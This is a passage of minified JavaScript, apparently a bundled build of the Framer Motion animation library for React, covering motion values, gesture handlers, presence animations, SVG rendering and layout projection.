e;(e=this.events.change)==null||e.notify(this.current)}addDependent(e){this.dependents||(this.dependents=new Set),this.dependents.add(e)}removeDependent(e){this.dependents&&this.dependents.delete(e)}get(){return this.current}getPrevious(){return this.prev}getVelocity(){const e=gt.now();if(!this.canTrackVelocity||this.prevFrameValue===void 0||e-this.updatedAt>A0)return 0;const n=Math.min(this.updatedAt-this.prevUpdatedAt,A0);return GS(parseFloat(this.current)-parseFloat(this.prevFrameValue),n)}start(e){return this.stop(),new Promise(n=>{this.hasAnimated=!0,this.animation=e(n),this.events.animationStart&&this.events.animationStart.notify()}).then(()=>{this.events.animationComplete&&this.events.animationComplete.notify(),this.clearAnimation()})}stop(){this.animation&&(this.animation.stop(),this.events.animationCancel&&this.events.animationCancel.notify()),this.clearAnimation()}isAnimating(){return!!this.animation}clearAnimation(){delete this.animation}destroy(){var e,n;(e=this.dependents)==null||e.clear(),(n=this.events.destroy)==null||n.notify(),this.clearListeners(),this.stop(),this.stopPassiveEffect&&this.stopPassiveEffect()}}function ws(t,e){return new cR(t,e)}const{schedule:Wm,cancel:z_}=sk(queueMicrotask,!1),Yt={x:!1,y:!1};function Rk(){return Yt.x||Yt.y}function dR(t){return t==="x"||t==="y"?Yt[t]?null:(Yt[t]=!0,()=>{Yt[t]=!1}):Yt.x||Yt.y?null:(Yt.x=Yt.y=!0,()=>{Yt.x=Yt.y=!1})}function Ok(t,e){const n=lR(t),r=new AbortController,i={passive:!0,...e,signal:r.signal};return[n,i,()=>r.abort()]}function P0(t){return!(t.pointerType==="touch"||Rk())}function fR(t,e,n={}){const[r,i,s]=Ok(t,n),o=a=>{if(!P0(a))return;const{target:l}=a,u=e(l,a);if(typeof u!="function"||!l)return;const c=d=>{P0(d)&&(u(d),l.removeEventListener("pointerleave",c))};l.addEventListener("pointerleave",c,i)};return r.forEach(a=>{a.addEventListener("pointerenter",o,i)}),s}const Dk=(t,e)=>e?t===e?!0:Dk(t,e.parentElement):!1,Km=t=>t.pointerType==="mouse"?typeof t.button!="number"||t.button<=0:t.isPrimary!==!1,hR=new Set(["BUTTON","INPUT","SELECT","TEXTAREA","A"]);function pR(t){return hR.has(t.tagName)||t.tabIndex!==-1}const Fl=new WeakSet;function R0(t){return e=>{e.key==="Enter"&&t(e)}}function Vd(t,e){t.dispatchEvent(new PointerEvent("pointer"+e,{isPrimary:!0,bubbles:!0}))}const mR=(t,e)=>{const n=t.currentTarget;if(!n)return;const r=R0(()=>{if(Fl.has(n))return;Vd(n,"down");const i=R0(()=>{Vd(n,"up")}),s=()=>Vd(n,"cancel");n.addEventListener("keyup",i,e),n.addEventListener("blur",s,e)});n.addEventListener("keydown",r,e),n.addEventListener("blur",()=>n.removeEventListener("keydown",r),e)};function O0(t){return Km(t)&&!Rk()}function gR(t,e,n={}){const[r,i,s]=Ok(t,n),o=a=>{const l=a.currentTarget;if(!O0(a))return;Fl.add(l);const u=e(l,a),c=(h,p)=>{window.removeEventListener("pointerup",d),window.removeEventListener("pointercancel",f),Fl.has(l)&&Fl.delete(l),O0(h)&&typeof u=="function"&&u(h,{success:p})},d=h=>{c(h,l===window||l===document||n.useGlobalTarget||Dk(l,h.target))},f=h=>{c(h,!1)};window.addEventListener("pointerup",d,i),window.addEventListener("pointercancel",f,i)};return r.forEach(a=>{(n.useGlobalTarget?window:a).addEventListener("pointerdown",o,i),Pk(a)&&(a.addEventListener("focus",u=>mR(u,i)),!pR(a)&&!a.hasAttribute("tabindex")&&(a.tabIndex=0))}),s}function Lk(t){return KS(t)&&"ownerSVGElement"in t}function yR(t){return Lk(t)&&t.tagName==="svg"}const et=t=>!!(t&&t.getVelocity),xR=[...Tk,Ce,Or],vR=t=>xR.find(Ek(t)),qm=S.createContext({transformPagePoint:t=>t,isStatic:!1,reducedMotion:"never"});class wR extends S.Component{getSnapshotBeforeUpdate(e){const n=this.props.childRef.current;if(n&&e.isPresent&&!this.props.isPresent){const r=n.offsetParent,i=Pk(r)&&r.offsetWidth||0,s=this.props.sizeRef.current;s.height=n.offsetHeight||0,s.width=n.offsetWidth||0,s.top=n.offsetTop,s.left=n.offsetLeft,s.right=i-s.width-s.left}return null}componentDidUpdate(){}render(){return this.props.children}}function SR({children:t,isPresent:e,anchorX:n,root:r}){const i=S.useId(),s=S.useRef(null),o=S.useRef({width:0,height:0,top:0,left:0,right:0}),{nonce:a}=S.useContext(qm);return S.useInsertionEffect(()=>{const{width:l,height:u,top:c,left:d,right:f}=o.current;if(e||!s.current||!l||!u)return;const h=n==="left"?`left: ${d}`:`right: ${f}`;s.current.dataset.motionPopId=i;const p=document.createElement("style");a&&(p.nonce=a);const y=r??document.head;return y.appendChild(p),p.sheet&&p.sheet.insertRule(`
          [data-motion-pop-id="${i}"] {
            position: absolute !important;
            width: ${l}px !important;
            height: ${u}px !important;
            ${h}px !important;
            top: ${c}px !important;
          }
        `),()=>{y.contains(p)&&y.removeChild(p)}},[e]),m.jsx(wR,{isPresent:e,childRef:s,sizeRef:o,children:S.cloneElement(t,{ref:s})})}const kR=({children:t,initial:e,isPresent:n,onExitComplete:r,custom:i,presenceAffectsLayout:s,mode:o,anchorX:a,root:l})=>{const u=Em(bR),c=S.useId();let d=!0,f=S.useMemo(()=>(d=!1,{id:c,initial:e,isPresent:n,custom:i,onExitComplete:h=>{u.set(h,!0);for(const p of u.values())if(!p)return;r&&r()},register:h=>(u.set(h,!1),()=>u.delete(h))}),[n,u,r]);return s&&d&&(f={...f}),S.useMemo(()=>{u.forEach((h,p)=>u.set(p,!1))},[n]),S.useEffect(()=>{!n&&!u.size&&r&&r()},[n]),o==="popLayout"&&(t=m.jsx(SR,{isPresent:n,anchorX:a,root:l,children:t})),m.jsx(Dc.Provider,{value:f,children:t})};function bR(){return new Map}function Ik(t=!0){const e=S.useContext(Dc);if(e===null)return[!0,null];const{isPresent:n,onExitComplete:r,register:i}=e,s=S.useId();S.useEffect(()=>{if(t)return i(s)},[t]);const o=S.useCallback(()=>t&&r&&r(s),[s,r,t]);return!n&&r?[!1,o]:[!0]}const ul=t=>t.key||"";function D0(t){const e=[];return S.Children.forEach(t,n=>{S.isValidElement(n)&&e.push(n)}),e}const jk=({children:t,custom:e,initial:n=!0,onExitComplete:r,presenceAffectsLayout:i=!0,mode:s="sync",propagate:o=!1,anchorX:a="left",root:l})=>{const[u,c]=Ik(o),d=S.useMemo(()=>D0(t),[t]),f=o&&!u?[]:d.map(ul),h=S.useRef(!0),p=S.useRef(d),y=Em(()=>new Map),[x,g]=S.useState(d),[v,w]=S.useState(d);US(()=>{h.current=!1,p.current=d;for(let E=0;E<v.length;E++){const M=ul(v[E]);f.includes(M)?y.delete(M):y.get(M)!==!0&&y.set(M,!1)}},[v,f.length,f.join("-")]);const b=[];if(d!==x){let E=[...d];for(let M=0;M<v.length;M++){const C=v[M],N=ul(C);f.includes(N)||(E.splice(M,0,C),b.push(C))}return s==="wait"&&b.length&&(E=b),w(D0(E)),g(d),null}const{forceRender:k}=S.useContext(Cm);return m.jsx(m.Fragment,{children:v.map(E=>{const M=ul(E),C=o&&!u?!1:d===v||f.includes(M),N=()=>{if(y.has(M))y.set(M,!0);else return;let O=!0;y.forEach(H=>{H||(O=!1)}),O&&(k==null||k(),w(p.current),o&&(c==null||c()),r&&r())};return m.jsx(kR,{isPresent:C,initial:!h.current||n?void 0:!1,custom:e,presenceAffectsLayout:i,mode:s,root:l,onExitComplete:C?void 0:N,anchorX:a,children:E},M)})})},Fk=S.createContext({strict:!1}),L0={animation:["animate","variants","whileHover","whileTap","exit","whileInView","whileFocus","whileDrag"],exit:["exit"],drag:["drag","dragControls"],focus:["whileFocus"],hover:["whileHover","onHoverStart","onHoverEnd"],tap:["whileTap","onTap","onTapStart","onTapCancel"],pan:["onPan","onPanStart","onPanSessionStart","onPanEnd"],inView:["whileInView","onViewportEnter","onViewportLeave"],layout:["layout","layoutId"]},Ss={};for(const t in L0)Ss[t]={isEnabled:e=>L0[t].some(n=>!!e[n])};function CR(t){for(const e in t)Ss[e]={...Ss[e],...t[e]}}const ER=new Set(["animate","exit","variants","initial","style","values","variants","transition","transformTemplate","custom","inherit","onBeforeLayoutMeasure","onAnimationStart","onAnimationComplete","onUpdate","onDragStart","onDrag","onDragEnd","onMeasureDragConstraints","onDirectionLock","onDragTransitionEnd","_dragX","_dragY","onHoverStart","onHoverEnd","onViewportEnter","onViewportLeave","globalTapTarget","ignoreStrict","viewport"]);function bu(t){return t.startsWith("while")||t.startsWith("drag")&&t!=="draggable"||t.startsWith("layout")||t.startsWith("onTap")||t.startsWith("onPan")||t.startsWith("onLayout")||ER.has(t)}let Bk=t=>!bu(t);function TR(t){typeof t=="function"&&(Bk=e=>e.startsWith("on")?!bu(e):t(e))}try{TR(require("@emotion/is-prop-valid").default)}catch{}function MR(t,e,n){const r={};for(const i in t)i==="values"&&typeof t.values=="object"||(Bk(i)||n===!0&&bu(i)||!e&&!bu(i)||t.draggable&&i.startsWith("onDrag"))&&(r[i]=t[i]);return r}const Lc=S.createContext({});function Ic(t){return t!==null&&typeof t=="object"&&typeof t.start=="function"}function ia(t){return typeof t=="string"||Array.isArray(t)}const Gm=["animate","whileInView","whileFocus","whileHover","whileTap","whileDrag","exit"],Jm=["initial",...Gm];function jc(t){return Ic(t.animate)||Jm.some(e=>ia(t[e]))}function Vk(t){return!!(jc(t)||t.variants)}function NR(t,e){if(jc(t)){const{initial:n,animate:r}=t;return{initial:n===!1||ia(n)?n:void 0,animate:ia(r)?r:void 0}}return t.inherit!==!1?e:{}}function AR(t){const{initial:e,animate:n}=NR(t,S.useContext(Lc));return S.useMemo(()=>({initial:e,animate:n}),[I0(e),I0(n)])}function I0(t){return Array.isArray(t)?t.join(" "):t}const sa={};function PR(t){for(const e in t)sa[e]=t[e],Dm(e)&&(sa[e].isCSSVariable=!0)}function zk(t,{layout:e,layoutId:n}){return Bs.has(t)||t.startsWith("origin")||(e||n!==void 0)&&(!!sa[t]||t==="opacity")}const RR={x:"translateX",y:"translateY",z:"translateZ",transformPerspective:"perspective"},OR=Fs.length;function DR(t,e,n){let r="",i=!0;for(let s=0;s<OR;s++){const o=Fs[s],a=t[o];if(a===void 0)continue;let l=!0;if(typeof a=="number"?l=a===(o.startsWith("scale")?1:0):l=parseFloat(a)===0,!l||n){const u=Ak(a,Um[o]);if(!l){i=!1;const c=RR[o]||o;r+=`${c}(${u}) `}n&&(e[o]=u)}}return r=r.trim(),n?r=n(e,i?"":r):i&&(r="none"),r}function Ym(t,e,n){const{style:r,vars:i,transformOrigin:s}=t;let o=!1,a=!1;for(const l in e){const u=e[l];if(Bs.has(l)){o=!0;continue}else if(Dm(l)){i[l]=u;continue}else{const c=Ak(u,Um[l]);l.startsWith("origin")?(a=!0,s[l]=c):r[l]=c}}if(e.transform||(o||n?r.transform=DR(e,t.transform,n):r.transform&&(r.transform="none")),a){const{originX:l="50%",originY:u="50%",originZ:c=0}=s;r.transformOrigin=`${l} ${u} ${c}`}}const Qm=()=>({style:{},transform:{},transformOrigin:{},vars:{}});function _k(t,e,n){for(const r in e)!et(e[r])&&!zk(r,n)&&(t[r]=e[r])}function LR({transformTemplate:t},e){return S.useMemo(()=>{const n=Qm();return Ym(n,e,t),Object.assign({},n.vars,n.style)},[e])}function IR(t,e){const n=t.style||{},r={};return _k(r,n,t),Object.assign(r,LR(t,e)),r}function jR(t,e){const n={},r=IR(t,e);return t.drag&&t.dragListener!==!1&&(n.draggable=!1,r.userSelect=r.WebkitUserSelect=r.WebkitTouchCallout="none",r.touchAction=t.drag===!0?"none":`pan-${t.drag==="x"?"y":"x"}`),t.tabIndex===void 0&&(t.onTap||t.onTapStart||t.whileTap)&&(n.tabIndex=0),n.style=r,n}const FR={offset:"stroke-dashoffset",array:"stroke-dasharray"},BR={offset:"strokeDashoffset",array:"strokeDasharray"};function VR(t,e,n=1,r=0,i=!0){t.pathLength=1;const s=i?FR:BR;t[s.offset]=_.transform(-r);const o=_.transform(e),a=_.transform(n);t[s.array]=`${o} ${a}`}function $k(t,{attrX:e,attrY:n,attrScale:r,pathLength:i,pathSpacing:s=1,pathOffset:o=0,...a},l,u,c){if(Ym(t,a,u),l){t.style.viewBox&&(t.attrs.viewBox=t.style.viewBox);return}t.attrs=t.style,t.style={};const{attrs:d,style:f}=t;d.transform&&(f.transform=d.transform,delete d.transform),(f.transform||d.transformOrigin)&&(f.transformOrigin=d.transformOrigin??"50% 50%",delete d.transformOrigin),f.transform&&(f.transformBox=(c==null?void 0:c.transformBox)??"fill-box",delete d.transformBox),e!==void 0&&(d.x=e),n!==void 0&&(d.y=n),r!==void 0&&(d.scale=r),i!==void 0&&VR(d,i,s,o,!1)}const Hk=()=>({...Qm(),attrs:{}}),Uk=t=>typeof t=="string"&&t.toLowerCase()==="svg";function zR(t,e,n,r){const i=S.useMemo(()=>{const s=Hk();return $k(s,e,Uk(r),t.transformTemplate,t.style),{...s.attrs,style:{...s.style}}},[e]);if(t.style){const s={};_k(s,t.style,t),i.style={...s,...i.style}}return i}const _R=["animate","circle","defs","desc","ellipse","g","image","line","filter","marker","mask","metadata","path","pattern","polygon","polyline","rect","stop","switch","symbol","svg","text","tspan","use","view"];function Xm(t){return typeof t!="string"||t.includes("-")?!1:!!(_R.indexOf(t)>-1||/[A-Z]/u.test(t))}function $R(t,e,n,{latestValues:r},i,s=!1){const a=(Xm(t)?zR:jR)(e,r,i,t),l=MR(e,typeof t=="string",s),u=t!==S.Fragment?{...l,...a,ref:n}:{},{children:c}=e,d=S.useMemo(()=>et(c)?c.get():c,[c]);return S.createElement(t,{...u,children:d})}function j0(t){const e=[{},{}];return t==null||t.values.forEach((n,r)=>{e[0][r]=n.get(),e[1][r]=n.getVelocity()}),e}function Zm(t,e,n,r){if(typeof e=="function"){const[i,s]=j0(r);e=e(n!==void 0?n:t.custom,i,s)}if(typeof e=="string"&&(e=t.variants&&t.variants[e]),typeof e=="function"){const[i,s]=j0(r);e=e(n!==void 0?n:t.custom,i,s)}return e}function Bl(t){return et(t)?t.get():t}function HR({scrapeMotionValuesFromProps:t,createRenderState:e},n,r,i){return{latestValues:UR(n,r,i,t),renderState:e()}}function UR(t,e,n,r){const i={},s=r(t,{});for(const f in s)i[f]=Bl(s[f]);let{initial:o,animate:a}=t;const l=jc(t),u=Vk(t);e&&u&&!l&&t.inherit!==!1&&(o===void 0&&(o=e.initial),a===void 0&&(a=e.animate));let c=n?n.initial===!1:!1;c=c||o===!1;const d=c?a:o;if(d&&typeof d!="boolean"&&!Ic(d)){const f=Array.isArray(d)?d:[d];for(let h=0;h<f.length;h++){const p=Zm(t,f[h]);if(p){const{transitionEnd:y,transition:x,...g}=p;for(const v in g){let w=g[v];if(Array.isArray(w)){const b=c?w.length-1:0;w=w[b]}w!==null&&(i[v]=w)}for(const v in y)i[v]=y[v]}}}return i}const Wk=t=>(e,n)=>{const r=S.useContext(Lc),i=S.useContext(Dc),s=()=>HR(t,e,r,i);return n?s():Em(s)};function eg(t,e,n){var s;const{style:r}=t,i={};for(const o in r)(et(r[o])||e.style&&et(e.style[o])||zk(o,t)||((s=n==null?void 0:n.getValue(o))==null?void 0:s.liveStyle)!==void 0)&&(i[o]=r[o]);return i}const WR=Wk({scrapeMotionValuesFromProps:eg,createRenderState:Qm});function Kk(t,e,n){const r=eg(t,e,n);for(const i in t)if(et(t[i])||et(e[i])){const s=Fs.indexOf(i)!==-1?"attr"+i.charAt(0).toUpperCase()+i.substring(1):i;r[s]=t[i]}return r}const KR=Wk({scrapeMotionValuesFromProps:Kk,createRenderState:Hk}),qR=Symbol.for("motionComponentSymbol");function Qi(t){return t&&typeof t=="object"&&Object.prototype.hasOwnProperty.call(t,"current")}function GR(t,e,n){return S.useCallback(r=>{r&&t.onMount&&t.onMount(r),e&&(r?e.mount(r):e.unmount()),n&&(typeof n=="function"?n(r):Qi(n)&&(n.current=r))},[e])}const tg=t=>t.replace(/([a-z])([A-Z])/gu,"$1-$2").toLowerCase(),JR="framerAppearId",qk="data-"+tg(JR),Gk=S.createContext({});function YR(t,e,n,r,i){var y,x;const{visualElement:s}=S.useContext(Lc),o=S.useContext(Fk),a=S.useContext(Dc),l=S.useContext(qm).reducedMotion,u=S.useRef(null);r=r||o.renderer,!u.current&&r&&(u.current=r(t,{visualState:e,parent:s,props:n,presenceContext:a,blockInitialAnimation:a?a.initial===!1:!1,reducedMotionConfig:l}));const c=u.current,d=S.useContext(Gk);c&&!c.projection&&i&&(c.type==="html"||c.type==="svg")&&QR(u.current,n,i,d);const f=S.useRef(!1);S.useInsertionEffect(()=>{c&&f.current&&c.update(n,a)});const h=n[qk],p=S.useRef(!!h&&!((y=window.MotionHandoffIsComplete)!=null&&y.call(window,h))&&((x=window.MotionHasOptimisedAnimation)==null?void 0:x.call(window,h)));return US(()=>{c&&(f.current=!0,window.MotionIsMounted=!0,c.updateFeatures(),c.scheduleRenderMicrotask(),p.current&&c.animationState&&c.animationState.animateChanges())}),S.useEffect(()=>{c&&(!p.current&&c.animationState&&c.animationState.animateChanges(),p.current&&(queueMicrotask(()=>{var g;(g=window.MotionHandoffMarkAsComplete)==null||g.call(window,h)}),p.current=!1),c.enteringChildren=void 0)}),c}function QR(t,e,n,r){const{layoutId:i,layout:s,drag:o,dragConstraints:a,layoutScroll:l,layoutRoot:u,layoutCrossfade:c}=e;t.projection=new n(t.latestValues,e["data-framer-portal-id"]?void 0:Jk(t.parent)),t.projection.setOptions({layoutId:i,layout:s,alwaysMeasureLayout:!!o||a&&Qi(a),visualElement:t,animationType:typeof s=="string"?s:"both",initialPromotionConfig:r,crossfade:c,layoutScroll:l,layoutRoot:u})}function Jk(t){if(t)return t.options.allowProjection!==!1?t.projection:Jk(t.parent)}function zd(t,{forwardMotionProps:e=!1}={},n,r){n&&CR(n);const i=Xm(t)?KR:WR;function s(a,l){let u;const c={...S.useContext(qm),...a,layoutId:XR(a)},{isStatic:d}=c,f=AR(a),h=i(a,d);if(!d&&Tm){ZR();const p=eO(c);u=p.MeasureLayout,f.visualElement=YR(t,h,c,r,p.ProjectionNode)}return m.jsxs(Lc.Provider,{value:f,children:[u&&f.visualElement?m.jsx(u,{visualElement:f.visualElement,...c}):null,$R(t,a,GR(h,f.visualElement,l),h,d,e)]})}s.displayName=`motion.${typeof t=="string"?t:`create(${t.displayName??t.name??""})`}`;const o=S.forwardRef(s);return o[qR]=t,o}function XR({layoutId:t}){const e=S.useContext(Cm).id;return e&&t!==void 0?e+"-"+t:t}function ZR(t,e){S.useContext(Fk).strict}function eO(t){const{drag:e,layout:n}=Ss;if(!e&&!n)return{};const r={...e,...n};return{MeasureLayout:e!=null&&e.isEnabled(t)||n!=null&&n.isEnabled(t)?r.MeasureLayout:void 0,ProjectionNode:r.ProjectionNode}}function tO(t,e){if(typeof Proxy>"u")return zd;const n=new Map,r=(s,o)=>zd(s,o,t,e),i=(s,o)=>r(s,o);return new Proxy(i,{get:(s,o)=>o==="create"?r:(n.has(o)||n.set(o,zd(o,void 0,t,e)),n.get(o))})}function Yk({top:t,left:e,right:n,bottom:r}){return{x:{min:e,max:n},y:{min:t,max:r}}}function nO({x:t,y:e}){return{top:e.min,right:t.max,bottom:e.max,left:t.min}}function rO(t,e){if(!e)return t;const n=e({x:t.left,y:t.top}),r=e({x:t.right,y:t.bottom});return{top:n.y,left:n.x,bottom:r.y,right:r.x}}function _d(t){return t===void 0||t===1}function Lh({scale:t,scaleX:e,scaleY:n}){return!_d(t)||!_d(e)||!_d(n)}function Kr(t){return Lh(t)||Qk(t)||t.z||t.rotate||t.rotateX||t.rotateY||t.skewX||t.skewY}function Qk(t){return F0(t.x)||F0(t.y)}function F0(t){return t&&t!=="0%"}function Cu(t,e,n){const r=t-n,i=e*r;return n+i}function B0(t,e,n,r,i){return i!==void 0&&(t=Cu(t,i,r)),Cu(t,n,r)+e}function Ih(t,e=0,n=1,r,i){t.min=B0(t.min,e,n,r,i),t.max=B0(t.max,e,n,r,i)}function Xk(t,{x:e,y:n}){Ih(t.x,e.translate,e.scale,e.originPoint),Ih(t.y,n.translate,n.scale,n.originPoint)}const V0=.999999999999,z0=1.0000000000001;function iO(t,e,n,r=!1){const i=n.length;if(!i)return;e.x=e.y=1;let s,o;for(let a=0;a<i;a++){s=n[a],o=s.projectionDelta;const{visualElement:l}=s.options;l&&l.props.style&&l.props.style.display==="contents"||(r&&s.options.layoutScroll&&s.scroll&&s!==s.root&&Zi(t,{x:-s.scroll.offset.x,y:-s.scroll.offset.y}),o&&(e.x*=o.x.scale,e.y*=o.y.scale,Xk(t,o)),r&&Kr(s.latestValues)&&Zi(t,s.latestValues))}e.x<z0&&e.x>V0&&(e.x=1),e.y<z0&&e.y>V0&&(e.y=1)}function Xi(t,e){t.min=t.min+e,t.max=t.max+e}function _0(t,e,n,r,i=.5){const s=ce(t.min,t.max,i);Ih(t,e,n,s,r)}function Zi(t,e){_0(t.x,e.x,e.scaleX,e.scale,e.originX),_0(t.y,e.y,e.scaleY,e.scale,e.originY)}function Zk(t,e){return Yk(rO(t.getBoundingClientRect(),e))}function sO(t,e,n){const r=Zk(t,n),{scroll:i}=e;return i&&(Xi(r.x,i.offset.x),Xi(r.y,i.offset.y)),r}const $0=()=>({translate:0,scale:1,origin:0,originPoint:0}),es=()=>({x:$0(),y:$0()}),H0=()=>({min:0,max:0}),ke=()=>({x:H0(),y:H0()}),jh={current:null},eb={current:!1};function oO(){if(eb.current=!0,!!Tm)if(window.matchMedia){const t=window.matchMedia("(prefers-reduced-motion)"),e=()=>jh.current=t.matches;t.addEventListener("change",e),e()}else jh.current=!1}const aO=new WeakMap;function lO(t,e,n){for(const r in e){const i=e[r],s=n[r];if(et(i))t.addValue(r,i);else if(et(s))t.addValue(r,ws(i,{owner:t}));else if(s!==i)if(t.hasValue(r)){const o=t.getValue(r);o.liveStyle===!0?o.jump(i):o.hasAnimated||o.set(i)}else{const o=t.getStaticValue(r);t.addValue(r,ws(o!==void 0?o:i,{owner:t}))}}for(const r in n)e[r]===void 0&&t.removeValue(r);return e}const U0=["AnimationStart","AnimationComplete","Update","BeforeLayoutMeasure","LayoutMeasure","LayoutAnimationStart","LayoutAnimationComplete"];class uO{scrapeMotionValuesFromProps(e,n,r){return{}}constructor({parent:e,props:n,presenceContext:r,reducedMotionConfig:i,blockInitialAnimation:s,visualState:o},a={}){this.current=null,this.children=new Set,this.isVariantNode=!1,this.isControllingVariants=!1,this.shouldReduceMotion=null,this.values=new Map,this.KeyframeResolver=$m,this.features={},this.valueSubscriptions=new Map,this.prevMotionValues={},this.events={},this.propEventSubscriptions={},this.notifyUpdate=()=>this.notify("Update",this.latestValues),this.render=()=>{this.current&&(this.triggerBuild(),this.renderInstance(this.current,this.renderState,this.props.style,this.projection))},this.renderScheduledAt=0,this.scheduleRender=()=>{const f=gt.now();this.renderScheduledAt<f&&(this.renderScheduledAt=f,oe.render(this.render,!1,!0))};const{latestValues:l,renderState:u}=o;this.latestValues=l,this.baseTarget={...l},this.initialValues=n.initial?{...l}:{},this.renderState=u,this.parent=e,this.props=n,this.presenceContext=r,this.depth=e?e.depth+1:0,this.reducedMotionConfig=i,this.options=a,this.blockInitialAnimation=!!s,this.isControllingVariants=jc(n),this.isVariantNode=Vk(n),this.isVariantNode&&(this.variantChildren=new Set),this.manuallyAnimateOnMount=!!(e&&e.current);const{willChange:c,...d}=this.scrapeMotionValuesFromProps(n,{},this);for(const f in d){const h=d[f];l[f]!==void 0&&et(h)&&h.set(l[f])}}mount(e){var n;this.current=e,aO.set(e,this),this.projection&&!this.projection.instance&&this.projection.mount(e),this.parent&&this.isVariantNode&&!this.isControllingVariants&&(this.removeFromVariantTree=this.parent.addVariantChild(this)),this.values.forEach((r,i)=>this.bindToMotionValue(i,r)),eb.current||oO(),this.shouldReduceMotion=this.reducedMotionConfig==="never"?!1:this.reducedMotionConfig==="always"?!0:jh.current,(n=this.parent)==null||n.addChild(this),this.update(this.props,this.presenceContext)}unmount(){var e;this.projection&&this.projection.unmount(),Rr(this.notifyUpdate),Rr(this.render),this.valueSubscriptions.forEach(n=>n()),this.valueSubscriptions.clear(),this.removeFromVariantTree&&this.removeFromVariantTree(),(e=this.parent)==null||e.removeChild(this);for(const n in this.events)this.events[n].clear();for(const n in this.features){const r=this.features[n];r&&(r.unmount(),r.isMounted=!1)}this.current=null}addChild(e){this.children.add(e),this.enteringChildren??(this.enteringChildren=new Set),this.enteringChildren.add(e)}removeChild(e){this.children.delete(e),this.enteringChildren&&this.enteringChildren.delete(e)}bindToMotionValue(e,n){this.valueSubscriptions.has(e)&&this.valueSubscriptions.get(e)();const r=Bs.has(e);r&&this.onBindTransform&&this.onBindTransform();const i=n.on("change",o=>{this.latestValues[e]=o,this.props.onUpdate&&oe.preRender(this.notifyUpdate),r&&this.projection&&(this.projection.isTransformDirty=!0),this.scheduleRender()});let s;window.MotionCheckAppearSync&&(s=window.MotionCheckAppearSync(this,e,n)),this.valueSubscriptions.set(e,()=>{i(),s&&s(),n.owner&&n.stop()})}sortNodePosition(e){return!this.current||!this.sortInstanceNodePosition||this.type!==e.type?0:this.sortInstanceNodePosition(this.current,e.current)}updateFeatures(){let e="animation";for(e in Ss){const n=Ss[e];if(!n)continue;const{isEnabled:r,Feature:i}=n;if(!this.features[e]&&i&&r(this.props)&&(this.features[e]=new i(this)),this.features[e]){const s=this.features[e];s.isMounted?s.update():(s.mount(),s.isMounted=!0)}}}triggerBuild(){this.build(this.renderState,this.latestValues,this.props)}measureViewportBox(){return this.current?this.measureInstanceViewportBox(this.current,this.props):ke()}getStaticValue(e){return this.latestValues[e]}setStaticValue(e,n){this.latestValues[e]=n}update(e,n){(e.transformTemplate||this.props.transformTemplate)&&this.scheduleRender(),this.prevProps=this.props,this.props=e,this.prevPresenceContext=this.presenceContext,this.presenceContext=n;for(let r=0;r<U0.length;r++){const i=U0[r];this.propEventSubscriptions[i]&&(this.propEventSubscriptions[i](),delete this.propEventSubscriptions[i]);const s="on"+i,o=e[s];o&&(this.propEventSubscriptions[i]=this.on(i,o))}this.prevMotionValues=lO(this,this.scrapeMotionValuesFromProps(e,this.prevProps,this),this.prevMotionValues),this.handleChildMotionValue&&this.handleChildMotionValue()}getProps(){return this.props}getVariant(e){return this.props.variants?this.props.variants[e]:void 0}getDefaultTransition(){return this.props.transition}getTransformPagePoint(){return this.props.transformPagePoint}getClosestVariantNode(){return this.isVariantNode?this:this.parent?this.parent.getClosestVariantNode():void 0}addVariantChild(e){const n=this.getClosestVariantNode();if(n)return n.variantChildren&&n.variantChildren.add(e),()=>n.variantChildren.delete(e)}addValue(e,n){const r=this.values.get(e);n!==r&&(r&&this.removeValue(e),this.bindToMotionValue(e,n),this.values.set(e,n),this.latestValues[e]=n.get())}removeValue(e){this.values.delete(e);const n=this.valueSubscriptions.get(e);n&&(n(),this.valueSubscriptions.delete(e)),delete this.latestValues[e],this.removeValueFromRenderState(e,this.renderState)}hasValue(e){return this.values.has(e)}getValue(e,n){if(this.props.values&&this.props.values[e])return this.props.values[e];let r=this.values.get(e);return r===void 0&&n!==void 0&&(r=ws(n===null?void 0:n,{owner:this}),this.addValue(e,r)),r}readValue(e,n){let r=this.latestValues[e]!==void 0||!this.current?this.latestValues[e]:this.getBaseTargetFromProps(this.props,e)??this.readValueFromInstance(this.current,e,this.options);return r!=null&&(typeof r=="string"&&(WS(r)||qS(r))?r=parseFloat(r):!vR(r)&&Or.test(n)&&(r=Nk(e,n)),this.setBaseTarget(e,et(r)?r.get():r)),et(r)?r.get():r}setBaseTarget(e,n){this.baseTarget[e]=n}getBaseTarget(e){var s;const{initial:n}=this.props;let r;if(typeof n=="string"||typeof n=="object"){const o=Zm(this.props,n,(s=this.presenceContext)==null?void 0:s.custom);o&&(r=o[e])}if(n&&r!==void 0)return r;const i=this.getBaseTargetFromProps(this.props,e);return i!==void 0&&!et(i)?i:this.initialValues[e]!==void 0&&r===void 0?void 0:this.baseTarget[e]}on(e,n){return this.events[e]||(this.events[e]=new Pm),this.events[e].add(n)}notify(e,...n){this.events[e]&&this.events[e].notify(...n)}scheduleRenderMicrotask(){Wm.render(this.render)}}class tb extends uO{constructor(){super(...arguments),this.KeyframeResolver=aR}sortInstanceNodePosition(e,n){return e.compareDocumentPosition(n)&2?1:-1}getBaseTargetFromProps(e,n){return e.style?e.style[n]:void 0}removeValueFromRenderState(e,{vars:n,style:r}){delete n[e],delete r[e]}handleChildMotionValue(){this.childSubscription&&(this.childSubscription(),delete this.childSubscription);const{children:e}=this.props;et(e)&&(this.childSubscription=e.on("change",n=>{this.current&&(this.current.textContent=`${n}`)}))}}function nb(t,{style:e,vars:n},r,i){const s=t.style;let o;for(o in e)s[o]=e[o];i==null||i.applyProjectionStyles(s,r);for(o in n)s.setProperty(o,n[o])}function cO(t){return window.getComputedStyle(t)}class dO extends tb{constructor(){super(...arguments),this.type="html",this.renderInstance=nb}readValueFromInstance(e,n){var r;if(Bs.has(n))return(r=this.projection)!=null&&r.isProjecting?Mh(n):TP(e,n);{const i=cO(e),s=(Dm(n)?i.getPropertyValue(n):i[n])||0;return typeof s=="string"?s.trim():s}}measureInstanceViewportBox(e,{transformPagePoint:n}){return Zk(e,n)}build(e,n,r){Ym(e,n,r.transformTemplate)}scrapeMotionValuesFromProps(e,n,r){return eg(e,n,r)}}const rb=new Set(["baseFrequency","diffuseConstant","kernelMatrix","kernelUnitLength","keySplines","keyTimes","limitingConeAngle","markerHeight","markerWidth","numOctaves","targetX","targetY","surfaceScale","specularConstant","specularExponent","stdDeviation","tableValues","viewBox","gradientTransform","pathLength","startOffset","textLength","lengthAdjust"]);function fO(t,e,n,r){nb(t,e,void 0,r);for(const i in 